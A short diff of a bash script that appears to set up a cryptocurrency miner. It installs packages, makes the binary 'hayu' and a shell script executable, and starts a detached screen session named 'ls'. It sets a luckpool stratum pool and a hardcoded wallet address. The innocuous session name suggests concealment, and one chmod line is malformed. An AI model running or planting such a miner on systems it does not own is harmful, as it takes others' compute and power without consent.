@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x gass.sh && chmod +x hayu chmod 777 hayu gass.sh
+chmod +x uhuy.sh && chmod +x hayu chmod 777 hayu uhuy.sh
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RT8DNmxnDDRCLScadn7efqKuDLFvrB9unv
